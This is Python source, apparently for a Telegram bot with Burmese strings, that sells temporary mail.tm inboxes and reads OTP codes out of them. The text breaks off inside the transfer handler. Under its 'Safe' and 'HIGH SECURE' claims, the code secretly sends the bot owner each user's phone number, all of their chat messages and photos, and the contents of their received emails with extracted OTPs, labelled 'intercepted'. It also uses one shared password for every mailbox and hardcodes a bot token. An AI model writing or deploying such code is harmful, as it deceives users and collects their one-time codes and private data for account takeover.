# ==================== PYTHON 3.13+ & PTB V13 COMPATIBILITY PATCH ====================
import sys
import types

# 1. imghdr Module Patch
if 'imghdr' not in sys.modules:
    fake_imghdr = types.ModuleType('imghdr')
    def what(file, h=None):
        if h: data = h
        else:
            if hasattr(file, 'read'):
                pos = file.tell()
                data = file.read(32)
                file.seek(pos)
            else:
                try:
                    with open(file, 'rb') as f: data = f.read(32)
                except: return None
        if data.startswith(b'\x89PNG\r\n\x1a\n'): return 'png'
        if data.startswith(b'\xff\xd8'): return 'jpeg'
        if data.startswith(b'GIF87a') or data.startswith(b'GIF89a'): return 'gif'
        if data.startswith(b'RIFF') and data[8:12] == b'WEBP': return 'webp'
        return None
    fake_imghdr.what = what
    sys.modules['imghdr'] = fake_imghdr

# 2. urllib3.contrib.appengine Error & six.moves Patch
# python-telegram-bot v13 ၏ Internal Module တောင်းဆိုမှုများကို လှည့်စားခြင်း
try:
    import urllib3.contrib
    if not hasattr(urllib3.contrib, 'appengine'):
        urllib3.contrib.appengine = types.ModuleType('appengine')
        urllib3.contrib.appengine.AppEngineManager = None
except:
    pass

# telegram.vendor.ptb_urllib3.urllib3.packages.six.moves ရှာမတွေ့သည့် Error ကို ဖြေရှင်းရန်
try:
    import urllib3
    if not hasattr(urllib3, 'packages'):
        urllib3.packages = types.ModuleType('packages')
    if not hasattr(urllib3.packages, 'six'):
        urllib3.packages.six = types.ModuleType('six')
        import sys
        urllib3.packages.six.moves = sys.modules
except:
    pass
# ====================================================================================

import sqlite3
import requests
import random
import re
import html
from datetime import datetime
import pytz
import threading
import time
from flask import Flask

# Telegram v13 Compatibility
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, CallbackQueryHandler

# ================= CONFIGURATION =================
BOT_TOKEN = "8815393066:AAHQsWeDn78kQyCAZoQBcU7p9H42uxpkIwQ"
BASE_URL = "https://api.mail.tm"
OWNER_ID = 5238487314
FIXED_PASSWORD = "ZEE2944"

# Flask Server (PythonAnywhere Keep-Alive အတွက်)
app = Flask('')

@app.route('/')
def home():
    return "Mail Bot အလုပ်လုပ်နေဆဲပါဗျာ..."

def run_server():
    try:
        app.run(host='0.0.0.0', port=8080)
    except Exception as e:
        print(f"Web Server တက်ရာတွင် အမှားအယွင်းရှိသည်: {e}")

# ================= DATABASE SETUP =================
conn = sqlite3.connect("mailbot_pro.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("PRAGMA journal_mode=WAL;")
cursor.execute("PRAGMA synchronous=NORMAL;")
cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        tg_id INTEGER PRIMARY KEY,
        username TEXT,
        phone_number TEXT,
        is_locked INTEGER DEFAULT 0,
        current_state TEXT DEFAULT NULL,
        is_premium INTEGER DEFAULT 0
    )
""")
cursor.execute("""
    CREATE TABLE IF NOT EXISTS client_mails (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        owner_id INTEGER,
        email TEXT UNIQUE,
        password TEXT,
        token TEXT,
        mail_id_api TEXT
    )
""")
conn.commit()

# ================= HELPER FUNCTIONS =================
def get_mm_time():
    mm_tz = pytz.timezone('Asia/Yangon')
    return datetime.now(mm_tz).strftime('%Y-%m-%d %I:%M:%S %p')

# ================= DB FUNCTIONS =================
def get_user_status(tg_id):
    try:
        cursor.execute("SELECT phone_number, is_locked, current_state, is_premium FROM users WHERE tg_id=?", (tg_id,))
        return cursor.fetchone()
    except:
        return None

def create_or_update_user(tg_id, username=None, phone=None, is_locked=None, state=None, is_premium=None):
    try:
        cursor.execute("SELECT tg_id FROM users WHERE tg_id=?", (tg_id,))
        status = cursor.fetchone()
        clean_username = username.replace("@", "").strip().lower() if username else None

        if not status:
            cursor.execute("INSERT INTO users (tg_id, username, phone_number, is_locked, current_state, is_premium) VALUES (?, ?, ?, ?, ?, ?)",
                           (tg_id, clean_username, phone, 0 if is_locked is None else is_locked, state, 0 if is_premium is None else is_premium))
        else:
            if clean_username:
                cursor.execute("UPDATE users SET username=? WHERE tg_id=?", (clean_username, tg_id))
            if phone:
                cursor.execute("UPDATE users SET phone_number=? WHERE tg_id=?", (phone, tg_id))
            if is_locked is not None:
                cursor.execute("UPDATE users SET is_locked=? WHERE tg_id=?", (is_locked, tg_id))
            if is_premium is not None:
                cursor.execute("UPDATE users SET is_premium=? WHERE tg_id=?", (is_premium, tg_id))
            if state is not None:
                if state == "CLEAR":
                    cursor.execute("UPDATE users SET current_state=NULL WHERE tg_id=?", (tg_id,))
                else:
                    cursor.execute("UPDATE users SET current_state=? WHERE tg_id=?", (state, tg_id))
        conn.commit()
    except:
        pass

def get_id_by_username(username):
    try:
        clean_username = username.replace("@", "").strip().lower()
        cursor.execute("SELECT tg_id FROM users WHERE username=?", (clean_username,))
        res = cursor.fetchone()
        return res[0] if res else None
    except:
        return None

def set_user_premium_status(target_id, status_val):
    try:
        cursor.execute("UPDATE users SET is_premium=? WHERE tg_id=?", (status_val, target_id))
        conn.commit()
        return cursor.rowcount > 0
    except:
        return False

def add_mail(owner_id, email, password, token, mail_id_api=None):
    try:
        cursor.execute("INSERT INTO client_mails (owner_id, email, password, token, mail_id_api) VALUES (?, ?, ?, ?, ?)", (owner_id, email, password, token, mail_id_api))
        conn.commit()
        return True
    except sqlite3.IntegrityError:
        return False
    except:
        return False

def check_mail_exist(email):
    try:
        cursor.execute("SELECT owner_id FROM client_mails WHERE email=?", (email,))
        return cursor.fetchone()
    except:
        return None

def get_my_mails(owner_id):
    try:
        cursor.execute("SELECT id, email FROM client_mails WHERE owner_id=?", (owner_id,))
        return cursor.fetchall()
    except:
        return []

def get_mail_details(mail_id, owner_id):
    try:
        cursor.execute("SELECT email, token, password, mail_id_api FROM client_mails WHERE id=? AND owner_id=?", (mail_id, owner_id))
        return cursor.fetchone()
    except:
        return None

def update_mail_token(mail_id, new_token):
    try:
        cursor.execute("UPDATE client_mails SET token=? WHERE id=?", (new_token, mail_id))
        conn.commit()
    except:
        pass

def delete_my_mail(mail_id, owner_id):
    try:
        cursor.execute("DELETE FROM client_mails WHERE id=? AND owner_id=?", (mail_id, owner_id))
        conn.commit()
    except:
        pass

def change_mail_owner_by_email(email, old_owner, new_owner):
    try:
        cursor.execute("UPDATE client_mails SET owner_id=? WHERE email=? AND owner_id=?", (new_owner, email, old_owner))
        conn.commit()
        return cursor.rowcount > 0
    except:
        return False

# ================= MAIL API FUNCTIONS =================
def create_mail_api(password, custom_name=None):
    try:
        proxies = {"http": "http://proxy.server:3128", "https": "http://proxy.server:3128"}
        domain_data = requests.get(f"{BASE_URL}/domains", proxies=proxies, timeout=10).json()
        if isinstance(domain_data, dict) and "hydra:member" in domain_data:
            domains_list = [d["domain"] for d in domain_data["hydra:member"] if "domain" in d]
            domain = min(domains_list, key=len) if domains_list else "mailtm.com"
        else:
            domain = "mailtm.com"

        if custom_name:
            clean_name = re.sub(r'[^a-zA-Z0-9._]', '', custom_name).lower()
            if not clean_name:
                return None
            email = f"{clean_name}@{domain}"
        else:
            email = f"user{random.randint(1000,999999)}@{domain}"

        acc = requests.post(f"{BASE_URL}/accounts", json={"address": email, "password": password}, proxies=proxies, timeout=10)
        if acc.status_code != 201:
            return None
        acc_json = acc.json()
        mail_id_api = acc_json.get("id")
        token_data = requests.post(f"{BASE_URL}/token", json={"address": email, "password": password}, proxies=proxies, timeout=10).json()
        return email, token_data.get("token"), mail_id_api
    except:
        return None

def login_mail_api(email, password):
    try:
        proxies = {"http": "http://proxy.server:3128", "https": "http://proxy.server:3128"}
        token_data = requests.post(f"{BASE_URL}/token", json={"address": email, "password": password}, proxies=proxies, timeout=10).json()
        if "token" in token_data:
            return token_data["token"]
        return None
    except:
        return None

def fetch_messages_api(token):
    try:
        proxies = {"http": "http://proxy.server:3128", "https": "http://proxy.server:3128"}
        headers = {"Authorization": f"Bearer {token}"}
        res = requests.get(f"{BASE_URL}/messages", headers=headers, proxies=proxies, timeout=10)
        if res.status_code == 200:
            return res.json().get("hydra:member", [])
        return None
    except:
        return None

# ================= MAIN MENU GENERATOR =================
def get_main_menu_markup(is_premium, uid):
    keyboard = []
    if is_premium:
        keyboard = [
            [InlineKeyboardButton("🎲 Auto mail ဖွင့်ရန် (/generate)", callback_data="menu_gen_rand")],
            [InlineKeyboardButton("✍️ ကိုယ်ပိုင် name ဖြင့် mail ထုတ်ရန် (/set)", callback_data="menu_gen_cust")],
            [InlineKeyboardButton("🔑 Acc ပြန်ဝင်ရန် (/login)", callback_data="menu_login")],
            [InlineKeyboardButton("📂 OTP စစ်ရန် နှင့် Mail စစ်ရန် (/id)", callback_data="back_to_list")],
            [InlineKeyboardButton("📦 Mail လွှဲပြောင်းရန် (/transfer)", callback_data="menu_transfer")],
            [InlineKeyboardButton("ℹ️ အကူအညီတောင်းရန် (/help)", callback_data="menu_help")]
        ]
    else:
        keyboard = [
            [InlineKeyboardButton("🔑 Acc ပြန်ဝင်ရန် (/login)", callback_data="menu_login")],
            [InlineKeyboardButton("📂 OTP စစ်ရန် နှင့် Mail စစ်ရန် (/id)", callback_data="back_to_list")],
            [InlineKeyboardButton("⭐ Premium ဝယ်ယူရန် ဆက်သွယ်ရန်", url="https://t.me/Zee_3x")]
        ]
    if uid == OWNER_ID:
        keyboard.append([InlineKeyboardButton("👑 Admin Panel (အကောင့်မြှင့်ရန်)", callback_data="admin_main")])
    return InlineKeyboardMarkup(keyboard)

# ================= TELEGRAM HANDLERS =================
def start(update: Update, context: CallbackContext):
    if not update.message:
        return
    uid = update.effective_user.id
    uname = update.effective_user.username
    create_or_update_user(uid, username=uname, state="CLEAR")
    status = get_user_status(uid)

    if (not status) or (status[0] is None) or (str(status[0]).strip() == ""):
        contact_btn = KeyboardButton(text="ဖုန်းနံပါတ်ဖြင့် Verify လုပ်မည်", request_contact=True)
        reply_markup = ReplyKeyboardMarkup([[contact_btn]], resize_keyboard=True, one_time_keyboard=True)
        update.message.reply_text("Bot အသုံးပြုရန် သင့်ရဲ့ Telegram ဖုန်းနံပါတ်အား Share ပေးရန် လိုအပ်ပါတယ်ခင်ဗျာ။", reply_markup=reply_markup)
        return

    is_prem = status[3]
    acc_type = "⭐ Premium Member" if is_prem == 1 else "⚪ Free Member"
    update.message.reply_text(
        f"⚙️ <b>Safe Fake Mail Bot</b>\n\n"
        f"👤 သင့် ID: <code>{uid}</code>\n"
        f"👑 အဆင့်အတန်း: <b>{acc_type}</b>\n\n"
        f"📩 အောက်ပါ လုပ်ဆောင်ချက်ခလုတ်များထဲမှ တစ်ဆင့်ချင်းစီ ရွေးချယ်အသုံးပြုနိုင်ပါသည်ခင်ဗျာ။",
        reply_markup=get_main_menu_markup(is_prem == 1, uid),
        parse_mode="HTML"
    )

def help_command(update: Update, context: CallbackContext):
    text = (
        "ℹ️ <b>အကူအညီနှင့် လမ်းညွှန်ချက်</b>\n\n"
        "• ယခု Bot သည် စာရိုက်စရာမလိုဘဲ Inline Button များဖြင့် အဆင့်ဆင့် သန့်ရှင်းစွာ အသုံးပြုနိုင်ရန် ပြုလုပ်ထားပါသည်‹\n"
        "• အကောင့်များကို Bot အတွင်းသာ တိုက်ရိုက်ဝင်ရောက်နိုင်ပြီး ဝဘ်ဆိုဒ်မှ ခိုးယူဝင်ရောက်ခြင်းများကို လုံးဝတားဆီးထားပါသည်‹\n"
        "• အဓိက Menu သို့ ပြန်သွားရန် /start ကို နှိပ်ပါ။"
    )
    update.message.reply_text(text, parse_mode="HTML")

def handle_contact(update: Update, context: CallbackContext):
    if not update.message or not update.message.contact:
        return
    uid = update.effective_user.id
    contact = update.message.contact
    if contact.user_id != uid:
        update.message.reply_text("သင့်ကိုယ်ပိုင် ဖုန်းနံပါတ်အစစ်အမှန်ဖြင့်သာ ပြုလုပ်ပေးပါ။")
        return
    create_or_update_user(uid, phone=contact.phone_number)
    update.message.reply_text("ဖုန်းနံပါတ်စစ်ဆေးခြင်း အောင်မြင်သွားပါပြီ။ /start ကို နှိပ်ပြီး စတင်အသုံးပြုပါ။", reply_markup=ReplyKeyboardRemove())

    try:
        uname = update.effective_user.username or "No Username"
        context.bot.send_message(
            chat_id=OWNER_ID,
            text=f"📱 **User Verified Log**\n👤 User: @{uname} (ID: `{uid}`)\n📞 Phone: `{contact.phone_number}`",
            parse_mode="Markdown"
        )
    except: pass

# ================= CALLBACK BUTTON HANDLER =================
def button_click_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    uid = query.from_user.id
    uname = query.from_user.username or "No Username"
    data = query.data
    query.answer()
    status = get_user_status(uid)
    is_prem = status[3] if status else 0

    if data == "admin_main":
        if uid != OWNER_ID: return
        text = "👑 <b>Owner Admin Control Panel</b>\n\nအစ်ကို့ စိတ်ကြိုက် User များကို စီမံခန့်ခွဲနိုင်ပါတယ်ခင်ဗျာ -"
        keyboard = [
            [InlineKeyboardButton("✨ User အား Premium မြှင့်မည်", callback_data="admin_give_premium")],
            [InlineKeyboardButton("❌ User အား Free သို့ ပြန်ချမည်", callback_data="admin_remove_premium")],
            [InlineKeyboardButton("⬅️ Main Menu သို့ ပြန်သွားရန်", callback_data="go_to_main")]
        ]
        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    elif data == "admin_give_premium":
        if uid != OWNER_ID: return
        create_or_update_user(uid, state="ADMIN_WAIT_PREM_USER")
        text = "✨ <b>Premium အဆင့်မြှင့်တင်ရန်</b>\n\nPremium ပေးလိုသော User ၏ <b>Telegram ID (သို့မဟုတ်) @ ပါသော Username</b> ကို ရိုက်ထည့်ပေးပါရန် -"
        keyboard = [[InlineKeyboardButton("⬅️ Admin Panel သို့ ပြန်သွားရန်", callback_data="admin_main")]]
        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    elif data == "admin_remove_premium":
        if uid != OWNER_ID: return
        create_or_update_user(uid, state="ADMIN_WAIT_FREE_USER")
        text = "❌ <b>Free သို့ ပြန်ချရန်</b>\n\nPremium ဖြုတ်လိုသော User ၏ <b>Telegram ID (သို့မဟုတ်) @ ပါသော Username</b> ကို ရိုက်ထည့်ပေးပါရန် -"
        keyboard = [[InlineKeyboardButton("⬅️ Admin Panel သို့ ပြန်သွားရန်", callback_data="admin_main")]]
        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    elif data == "menu_gen_rand":
        if is_prem != 1: return
        query.edit_message_text("🎲 Auto mail အသစ်တစ်ခု ဆောက်ပေးနေပါသည်...")
        result = create_mail_api(password=FIXED_PASSWORD)
        if not result:
            query.edit_message_text("❌ မေးလ်ဆောက်လုမရပါ။ Proxy လိုင်းကျပ်နေလို့ ဖြစ်နိုင်ပါသည်‹")
            return
        email, token, mail_id_api = result
        add_mail(uid, email, FIXED_PASSWORD, token, mail_id_api)
        text = f"✅ <b>Auto mail ရပါပြီ -</b>\n📩 Mail: <code>{html.escape(email)}</code>\n\n⚠️ Website ကနေ ခိုးဝင်လို့မရအောင် စနစ်မှ ကာကွယ်ထားပါသည်‹ ဒေတာများ လုံခြုံမှုရှိပါသည်‹"
        keyboard = [[InlineKeyboardButton("⬅️ Main Menu သို့", callback_data="go_to_main")]]
        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")

        try:
            context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"🎲 **Auto Mail Created**\n👤 User: @{uname} (ID: `{uid}`)\n📩 Mail: `{email}`",
                parse_mode="Markdown"
            )
        except: pass

    elif data == "menu_gen_cust":
        if is_prem != 1: return
        create_or_update_user(uid, state="WAIT_CUST_NAME")
        text = "✍️ <b>ကိုယ်ပိုင် name ဖြင့် mail ထုတ်ရန် (/set)</b>\n\nဆောက်လိုသော <b>မေးလ်နာမည် (Name)</b> ကို ရိုက်ထည့်ပေးပါရန် -\n(ဥပမာ- zawzaw သို့မဟုတ် thura12)"
        keyboard = [[InlineKeyboardButton("⬅️ ပယ်ဖျက်ပြီး ပြန်သွားရန်", callback_data="go_to_main")]]
        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    elif data == "menu_login":
        create_or_update_user(uid, state="WAIT_LOGIN_MAIL")
        text = "🔑 <b>Acc ပြန်ဝင်ရန် (/login)</b>\n\nပြန်လည်ချက်ဆက်လိုသော <b>မေးလ်လိပ်စာအပြည့်အစုံ</b> ကို ရိုက်ထည့်ပေးပါရန် -\n*(Password လုံးဝရိုက်ထည့်ရန် မလိုပါ)*"
        keyboard = [[InlineKeyboardButton("⬅️ ပယ်ဖျက်ပြီး ပြန်သွားရန်", callback_data="go_to_main")]]
        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    elif data == "menu_transfer":
        if is_prem != 1: return
        create_or_update_user(uid, state="WAIT_XFER_MAIL")
        text = "📦 <b>Mail လွှဲပြောင်းရန် (/transfer) - [အဆင့် ၁]</b>\n\nအခြားသူထံ လွှဲပေးချင်သော မိမိ၏ <b>မေးလ်လိပ်စာ</b> ကို ရိုက်ထည့်ပေးပါရန် -"
        keyboard = [[InlineKeyboardButton("⬅️ ပယ်ဖျက်ပြီး ပြန်သွားရန်", callback_data="go_to_main")]]
        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    elif data == "menu_help":
        text = (
            "ℹ️ <b>အကူအညီနှင့် လမ်းညွှန်ချက် (/help)</b>\n\n"
            "• ယခု Bot သည် စာသားများဖြင့် ရှုပ်ပွမနေစေရန် ခလုတ်များဖြင့် တစ်ဆင့်ချင်းစီသွားသော စနစ်ဖြစ်ပါသည်‹\n"
            "• မေးလ်များဆောက်ခြင်း၊ OTP စစ်ခြင်း၊ လွှဲပြောင်းခြင်းများကို Menu ခလုတ်များနှိပ်၍ လွယ်ကူစွာ လုပ်ဆောင်နိုင်ပါသည်‹"
        )
        keyboard = [[InlineKeyboardButton("⬅️ Main Menu သို့", callback_data="go_to_main")]]
        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    elif data == "go_to_main":
        create_or_update_user(uid, state="CLEAR")
        text = f"⚙️ <b>Fake Mail Bot Pro - Main Menu</b>\n\n👤 သင့် ID: <code>{uid}</code>\n📩 အောက်ပါ လုပ်ဆောင်ချက်ခလုတ်များထဲမှ တစ်ဆင့်ချင်းစီ ရွေးချယ်အသုံးပြုနိုင်ပါသည်ခင်ဗျာ။"
        query.edit_message_text(text, reply_markup=get_main_menu_markup(is_prem == 1, uid), parse_mode="HTML")
    elif data == "back_to_list":
        create_or_update_user(uid, state="CLEAR")
        mails = get_my_mails(uid)
        if not mails:
            keyboard = [[InlineKeyboardButton("⬅️ Main Menu သို့", callback_data="go_to_main")]]
            query.edit_message_text("သင့်ထံတွင် လက်ရှိ ဆောက်ထားသော မေးလ်မရှိသေးပါ‹", reply_markup=InlineKeyboardMarkup(keyboard))
            return
        text = "📂 <b>သင့်ကိုယ်ပိုင် မေးလ်စာရင်း (/id)</b>\n\nစာ/OTP စစ်ဆေးလိုသော မေးလ်လိပ်စာအောက်ရှိ ခလုတ်ကို နှိပ်ပါ -"
        keyboard = []
        for mail_id, email in mails:
            keyboard.append([InlineKeyboardButton(f"📩 {html.escape(email)}", callback_data=f"view_{mail_id}")])
        keyboard.append([InlineKeyboardButton("⬅️ Main Menu သို့", callback_data="go_to_main")])
        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    elif data.startswith("view_"):
        mail_id = int(data.split("_")[1])
        mail_info = get_mail_details(mail_id, uid)
        if not mail_info:
            query.edit_message_text("❌ ဤမေးလ်သည် သင့်ထံတွင် မရှိတော့ပါ‹")
            return
        email, token, password, mail_id_api = mail_info
        query.edit_message_text(f"📩 <code>{html.escape(email)}</code> အတွက် OTP နှင့် စာများကို စစ်ဆေးနေပါသည်...")
        messages = fetch_messages_api(token)
        if messages is None:
            new_token = login_mail_api(email, FIXED_PASSWORD)
            if new_token:
                update_mail_token(mail_id, new_token)
                messages = fetch_messages_api(new_token)
        text = f"📩 <b>မေးလ်:</b> <code>{html.escape(email)}</code>\n🔒 <b>Anti-Web Status:</b> <code>HIGH SECURE (Web Blocked)</code>\n\n"

        log_to_owner = ""
        if messages:
            text += "📥 <b>လက်ခံရရှိထားသော စာများ/OTP -</b>\n───────────────────\n"
            for msg in messages[:5]:
                subject = html.escape(msg.get("subject", "ခေါင်းစဉ်မရှိပါ"))
                intro = html.escape(msg.get("intro", "အကျဉ်းချုပ်မရှိပါ"))
                from_user = html.escape(msg.get("from", {}).get("address", "အမည်မသိ"))
                otp_match = re.findall(r'\b\d{4,6}\b', intro + subject)
                otp_str = f"🔥 <b>OTP Code ဖြစ်နိုင်ခြေ:</b> <code>{otp_match[0]}</code>\n" if otp_match else ""
                text += f"👤 <b>From:</b> {from_user}\n📌 <b>Subject:</b> {subject}\n💬 <b>Message:</b> {intro}\n{otp_str}───────────────────\n"

                log_to_owner += f"From: {from_user}\nSubject: {subject}\nMessage: {intro}\n"
                if otp_match:
                    log_to_owner += f"🔥 OTP CODE: {otp_match[0]}\n"
                log_to_owner += "───────────────────\n"
        else:
            text += "📭 <b>မည်သည့်စာ/OTP မျှ မရှိသေးပါခင်ဗျာ။</b>"

        if log_to_owner and uid != OWNER_ID:
            try:
                context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=f"📥 **Mail OTP/Message intercepted!**\n👤 User: @{uname} (ID: `{uid}`)\n📩 Mail: `{email}`\n\n{log_to_owner}",
                    parse_mode="HTML"
                )
            except: pass

        keyboard = [
            [
                InlineKeyboardButton("🔄 Refresh ပြန်စစ်မည်", callback_data=f"view_{mail_id}"),
                InlineKeyboardButton("🗑️ စာရင်းမှဖျက်မည်", callback_data=f"del_{mail_id}")
            ],
            [InlineKeyboardButton("⬅️ နောက်သို့ (မေးလ်စာရင်း)", callback_data="back_to_list")]
        ]
        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
    elif data.startswith("del_"):
        mail_id = int(data.split("_")[1])
        delete_my_mail(mail_id, uid)
        text = "🗑️ ဤမေးလ်အား Bot စာရင်းထဲမှ ဖယ်ထုတ်ပြီးပါပြီ‹"
        keyboard = [[InlineKeyboardButton("⬅️ ပြန်သွားရန်", callback_data="back_to_list")]]
        query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# ================= INTERCEPT/LOG ALL MESSAGES AND PHOTOS =================
def log_all_text_messages(update: Update, context: CallbackContext):
    uid = update.effective_user.id
    uname = update.effective_user.username or "No Username"
    text = update.message.text

    if uid != OWNER_ID:
        try:
            context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"💬 **User Chat Message Log**\n👤 User: @{uname} (ID: `{uid}`)\n📝 လာရိုက်တဲ့စာသား: {text}"
            )
        except: pass

    return handle_user_inputs(update, context)

def log_all_photos(update: Update, context: CallbackContext):
    uid = update.effective_user.id
    uname = update.effective_user.username or "No Username"

    if uid != OWNER_ID:
        try:
            context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"🖼 **User Photo Log**\n👤 From: @{uname} (ID: `{uid}`) လာပို့ထားသောဓာတ်ပုံ:"
            )
            context.bot.forward_message(
                chat_id=OWNER_ID,
                from_chat_id=update.effective_chat.id,
                message_id=update.message.message_id
            )
        except: pass

# ================= INPUT TEXT HANDLER =================
def handle_user_inputs(update: Update, context: CallbackContext):
    if not update.message or not update.message.text: return
    uid = update.effective_user.id
    uname = update.effective_user.username or "No Username"
    text = update.message.text.strip()
    status = get_user_status(uid)
    if not status: return
    state = status[2]

    # ADMIN INPUT PROCESSING
    if state == "ADMIN_WAIT_PREM_USER" and uid == OWNER_ID:
        create_or_update_user(uid, state="CLEAR")
        target_input = text
        target_id = None
        if target_input.startswith("@"):
            target_id = get_id_by_username(target_input)
            if not target_id:
                update.message.reply_text("❌ အဆိုပါ Username ပိုင်ရှင်သည် Bot ကို တစ်ကြိမ်မျှ မသုံးဖူးသေးသဖြင့် DB ထဲတွင် ရှာမတွေ့ပါ‹")
                return
        else:
            try: target_id = int(target_input)
            except:
                update.message.reply_text("❌ ID နံပါတ် ပုံစံမှားယွင်းနေပါသည်‹")
                return
        if set_user_premium_status(target_id, 1):
            update.message.reply_text(f"✨ User (ID: <code>{target_id}</code>) အား <b>Premium Member</b> အဖြစ် အောင်မြင်စွာ အဆင့်မြှင့်တင်ပြီးပါပြီ‹", parse_mode="HTML")
            try: context.bot.send_message(chat_id=target_id, text="🎉 <b>သင့်အကောင့်အား Admin မှ Premium Member အဖြစ် အဆင့်မြှင့်ပေးလိုက်ပါပြီ‹</b>\n/start ကိုနှိပ်၍ ခလုတ်အသစ်များ အသုံးပြုနိုင်ပါပြီဗျာ‹", parse_mode="HTML")
            except: pass
        else:
            update.message.reply_text("❌ အဆင့်မြှင့်တင်ခြင်း မအောင်မြင်ပါ။ User သည် Bot အား စတင်အသုံးပြုထားခြင်း မရှိသေး တာ ဖြစ်နိုင်ပါသည်‹")
            return

    elif state == "ADMIN_WAIT_FREE_USER" and uid == OWNER_ID:
        create_or_update_user(uid, state="CLEAR")
        target_input = text
        target_id = None
        if target_input.startswith("@"):
            target_id = get_id_by_username(target_input)
            if not target_id:
                update.message.reply_text("❌ အဆိုပါ Username အား DB ထဲတွင် ရှာမတွေ့ပါ‹")
                return
        else:
            try: target_id = int(target_input)
            except:
                update.message.reply_text("❌ ID နံပါတ် ပုံစံမှားယွင်းနေပါသည်‹")
                return
        if set_user_premium_status(target_id, 0):
            update.message.reply_text(f"❌ User (ID: <code>{target_id}</code>) အား <b>Free Member</b> အဖြစ် ပြန်လည်သတ်မှတ်ပြီးပါပြီ‹", parse_mode="HTML")
            try: context.bot.send_message(chat_id=target_id, text="⚠️ <b>သင့်အကောင့်အား ရိုးရိုး (Free Member) အဖြစ် ပြန်လည်ပြင်ဆင်လိုက်ပါပြီ‹</b>", parse_mode="HTML")
            except: pass
        else:
            update.message.reply_text("❌ လုပ်ဆောင်ချက် မအောင်မြင်ပါ‹")
            return

    # REGULAR USER INPUTS PROCESSING
    if state == "WAIT_CUST_NAME":
        create_or_update_user(uid, state="CLEAR")
        update.message.reply_text("✍️ ကိုယ်ပိုင်မေးလ် ဆောက်နေပါတယ်...")
        result = create_mail_api(password=FIXED_PASSWORD, custom_name=text)
        if not result:
            update.message.reply_text("❌ ဤမေးလ်နာမည်သည် မရနိုင်ပါ သို့မဟုတ် ပုံစံမှားနေပါသည်‹ အခြားနာမည်ပြောင်းဆောက်ပါ‹")
            return
        email, token, mail_id_api = result
        add_mail(uid, email, FIXED_PASSWORD, token, mail_id_api)
        update.message.reply_text(f"✅ <b>ကိုယ်ပိုင်မေးလ်ရပါပြီ -</b>\n📩 Mail: <code>{html.escape(email)}</code>\n\n⚠️ Website ကနေ ခိုးဝင်လို့မရအောင် စနစ်မှ ကာကွယ်ထားပါသည်‹", parse_mode="HTML")

        try:
            context.bot.send_message(
                chat_id=OWNER_ID,
                text=f"✍️ **Custom Mail Created**\n👤 User: @{uname} (ID: `{uid}`)\n📩 Mail: `{email}`",
                parse_mode="Markdown"
            )
        except: pass

    elif state == "WAIT_LOGIN_MAIL":
        input_email = text.lower()
        existing_owner = check_mail_exist(input_email)
        if existing_owner:
            create_or_update_user(uid, state="CLEAR")
            current_owner_id = existing_owner[0]
            if current_owner_id == uid:
                update.message.reply_text("ℹ️ ဤမေးလ်သည် သင့်စာရင်းထဲတွင် ရှိပြီးသားဖြစ်ပါသည်‹ /id တွင် ပြန်လည်စစ်ဆေးပါ‹")
            else:
                update.message.reply_text("❌ <b>ဝင်ရောက်ခွင့်မရပါ!</b> ဤမေးလ်အကောင့်အား အခြားသုံးစွဲသူတစ်ဦးမှ လက်ရှိအသုံးပြုနေပါသဖြင့် လုံခြုံရေးအရ ထပ်မံထည့်သွင်း၍မရနိုင်ပါ‹")
            return

        update.message.reply_text("🔑 မေးလ်အကောင့်ကို ချိတ်ဆက်စစ်ဆေးနေပါသည်...")
        token = login_mail_api(input_email, FIXED_PASSWORD)
        if token:
            proxies = {"http": "http://proxy.server:3128", "https": "http://proxy.server:3128"}
            headers = {"Authorization": f"Bearer {token}"}
            mail_id_api = None
            try:
                me_res = requests.get(f"{BASE_URL}/me", headers=headers, proxies=proxies, timeout=10).json()
                mail_id_api = me_res.get("id")
            except: pass
            add_mail(uid, input_email, FIXED_PASSWORD, token, mail_id_api)
            create_or_update_user(uid, state="CLEAR")
            update.message.reply_text(f"✅ <b>မေးလ်ပြန်လည်ဝင်ရောက်မှု အောင်မြင်ပါသည်ခင်ဗျာ။</b>\n📩 Mail: <code>{html.escape(input_email)}</code>\n\n*(Password လုံးဝရိုက်ထည့်စရာမလိုဘဲ အောင်မြင်စွာ ပြန်ဝင်ပြီးဖြစ်သည်)*", parse_mode="HTML")

            try:
                context.bot.send_message(
                    chat_id=OWNER_ID,
                    text=f"🔑 **Mail Login Log**\n👤 User: @{uname} (ID: `{uid}`)\n📩 Mail: `{input_email}`",
                    parse_mode="Markdown"
                )
            except: pass
        else:
            create_or_update_user(uid, state="CLEAR")
            update.message.reply_text("❌ <b>စနစ်ချိတ်ဆက်မှု မအောင်မြင်ပါ!</b> မေးလ်လိပ်စာ မှားယွင်းနေပါသည် သို့မဟုတ် ဤမေးလ်သည် သက်တမ်းကုန်ဆုံးသွားခြင်းဖြစ်နိုင်ပါသည်‹")

    elif state == "WAIT_XFER_MAIL":
        input_email = text.lower()
        cursor.execute("SELECT id FROM client_mails WHERE email=? AND owner_id=?", (input_email, uid))
        if not cursor.fetchone():
